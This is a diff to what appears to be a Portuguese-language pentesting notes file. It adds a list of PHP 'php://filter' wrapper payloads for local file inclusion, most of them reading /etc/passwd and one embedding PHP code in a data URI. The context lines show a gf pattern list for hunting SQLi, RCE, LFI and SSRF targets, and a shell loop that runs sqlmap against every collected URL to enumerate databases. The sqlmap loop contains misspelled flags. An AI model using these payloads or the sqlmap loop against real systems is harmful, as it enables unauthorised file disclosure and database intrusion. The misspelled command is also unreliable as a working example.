@@ -36,3 +36,14 @@ gf = (ssrf,xss,ssti,sqli,redirect,rce,lfi,jsvar,interestingsubs,insterestingpara
 jogando para sqlmap:
 
 while read line; do sqlmap -u $line --parse-erros --current-db --invalid-logical --invalid-bignum --invalid-string --riks 3;done < sqli.txt
+
+<h1>Filters PHP</h1>
+php://filter/string.toupper/string.rot13/string.tolower/resource=file:///etc/passwd</br>
+php://filter/zlib.deflate/convert.base64-encode/resource=file:///etc/passwd</br>
+php://filter/convert.iconv.utf-8.utf-16le/resource=data://plain/text,trololohellooo=</br>
+php://filter/convert.quoted-printable-encode/resource=data://plain/text,£hellooo=</br>
+php://filter/convert.quoted-printable-encode/resource=data://plain/text,£hellooo=</br>
+php://filter/convert.base64-decode/resource=data://plain/text,aGVsbG8=</br>
+php://filter/string.strip_tags/resource=data://text/plain,<b>Bold</b><?php php code; ?>lalalala</br>
+php://filter/string.toupper/string.rot13/string.tolower/resource=file:///etc/passwd</br>
+php://filter/read=string.toupper|string.rot13|string.tolower/resource=file:///etc/passwd</br>
